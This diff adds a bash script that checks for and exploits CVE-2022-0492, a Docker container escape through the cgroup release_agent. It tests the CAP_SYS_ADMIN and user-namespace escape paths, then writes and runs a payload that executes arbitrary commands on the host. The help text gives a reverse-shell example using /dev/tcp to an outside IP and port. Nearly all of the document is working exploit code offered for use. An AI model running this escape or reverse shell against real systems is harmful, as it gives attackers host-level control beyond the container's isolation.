@@ -1,0 +1,184 @@
+#!/bin/bash
+
+##
+## https://github.com/T1erno/CVE-2022-0492-Docker-Breakout-Checker-and-PoC
+##
+
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[;33m'        # Yellow
+Blue='\033[;34m'          # Blue
+Cyan='\033[0;36m'         # Cyan
+BRed='\033[1;31m'         # Bold Red
+BBlue='\033[1;34m'        # Blod Blue
+On_Yellow='\033[43m'      # Background Yellow
+Color_Off='\033[0m'       # Text Reset
+
+
+options=$(getopt -o hc: -l help,command:,checker -n "$0" -- "$@") || exit
+eval set -- "$options"
+
+
+help(){
+    printf "[${Yellow}>${Color_Off}] ${BBlue}CVE-2022-0492 Docker Container Escape${Color_Off}                                           ${Cyan}V    ${Color_Off}\n"
+    printf "[${Yellow}>${Color_Off}] ${Blue}Execute this script in a Docker to check for vulnerability or to exploit it. (º___\\/{${Color_Off}\n"
+    printf "[${Yellow}>${Color_Off}] ${Yellow}Usage:"
+    printf "${Green}\n"
+    printf "        sh $(basename "$0")    --checker                Verify if system is vulnerable.\n"
+    printf "        sh $(basename "$0") -c|--command <COMMAND>      Execute command on host machine.\n"
+    printf "        sh $(basename "$0") -h|--help                   Print the help panel.${Color_Off}\n\n"
+    printf "[${Yellow}>${Color_Off}] ${Yellow}Example:"
+    printf "${Green}\n"
+    printf "        sh $(basename "$0") --command 'bash -c \"bash -i >& /dev/tcp/192.168.100.17/4444 0>&1\"'${Color_Off}\n"
+    exit 0
+}
+
+rootchecker(){
+
+    if [ "$(whoami)" "!=" "root" ]; then
+        printf "[${Red}!${Color_Off}] ${Red}ERROR: Root required.${Color_Off}\n"
+    fi
+
+}
+
+create_test_dir(){
+
+    # test dir
+    test_dir=/tmp/.cve-2022-0492-test
+    if ! mkdir -p $test_dir ; then
+        printf "[{Red}!${Color_Off}] ${Red}ERROR: failed to create test directory at $test_dir.${Color_Off}\n"
+        exit 1
+    fi
+
+
+}
+
+via_CAP_SYS_ADMIN(){
+
+    # Testing escape via CAP_SYS_ADMIN is possible - v1
+    
+    create_test_dir
+
+    if mount -t cgroup -o memory cgroup $test_dir >/dev/null 2>&1 ; then
+        if test -w $test_dir/release_agent ; then
+            umount $test_dir && rm -rf $test_dir
+            return 0
+        fi
+        umount $test_dir
+    else
+        return 1
+    fi
+
+}
+
+via_user_namespaces(){
+
+    # Testing escape via user namespaces is possible - v2
+
+    create_test_dir
+
+    local status=1
+    cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$' | while read -r subsys
+    do
+        if unshare -UrmC --propagation=unchanged bash -c "mount -t cgroup -o $subsys cgroup $test_dir 2>&1 >/dev/null && test -w $test_dir/release_agent" >/dev/null 2>&1 ; then
+            rm -rf $test_dir
+            status=0
+        fi
+    done
+    return $status
+
+}
+
+checker(){
+
+    printf "[${Red}*${Color_Off}] ${BBlue}Testing if CVE-2022-0492 can be exploited for container escape${Color_Off}\n"
+
+    rootchecker
+
+    if via_user_namespaces ; then
+        printf "[${Green}!${Color_Off}] ${Red}Exploitable: the container can abuse ${On_Yellow}${BRed}user namespaces${Color_Off}${Red} to escape.${Color_Off}\n"
+    elif via_CAP_SYS_ADMIN ; then
+        printf "[${Green}!${Color_Off}] ${Red}Exploitable: the container can escape as it runs with ${On_Yellow}${BRed}CAP_SYS_ADMIN${Color_Off}${Red}.${Color_Off}\n"
+    else
+        printf "[${Red}!${Color_Off}] ${Red}ERROR: Cannot escape, may not be vulnerable to CVE-2022-0492.${Color_Off}\n"
+    fi
+
+    exit
+
+}
+
+exploit(){
+
+cat << EOF > /tmp/exploit.sh
+#/bin/sh
+
+(mkdir /tmp/$DIRECTORY && mount -t cgroup -o $subsys cgroup /tmp/$DIRECTORY && mkdir /tmp/$DIRECTORY/x) 2>/dev/null
+
+echo 1 > /tmp/$DIRECTORY/x/notify_on_release
+echo "$host_path/cmd" > /tmp/$DIRECTORY/release_agent
+
+echo '#!/bin/sh' > /cmd
+echo "$payload" >> /cmd
+chmod a+x /cmd
+
+sh -c "echo \\\$\\\$ > /tmp/$DIRECTORY/x/cgroup.procs"
+
+EOF
+
+chmod +x /tmp/exploit.sh
+
+}
+
+comand(){
+
+    rootchecker
+
+    #Just generate a random string to use as directory name
+    DIRECTORY=$(cat /proc/sys/kernel/random/uuid) 
+    subsys="rdma"
+    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+    payload="$@"
+
+
+    if via_CAP_SYS_ADMIN ; then
+
+
+        printf "${Blue}"
+        exploit
+        ./tmp/exploit.sh
+        cat /cmd
+        printf "${Color_Off}"
+
+
+    elif via_user_namespaces ; then
+
+        printf "${Blue}"
+        exploit
+        cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$' | while read -r subsys
+        do
+            unshare -UrmC --propagation=unchanged sh -c ./tmp/exploit.sh
+        done
+        printf "${Color_Off}"
+
+
+    else
+
+        printf "[${Red}!${Color_Off}] ${Red}ERROR: Cannot escape, may not be vulnerable to CVE-2022-0492.${Color_Off}\n"
+
+    fi
+
+}
+
+if [ $# -eq 1 ]
+then
+    help
+fi
+
+while [ $1 != -- ]; do
+    case $1 in
+        -c|--command) comand $2 ; shift 2;;
+        --checker) checker;  shift 1;;
+        -h|--help) help;  shift 1;;
+        *) echo "bad option: $1" >&2; exit 1;;
+    esac
+done
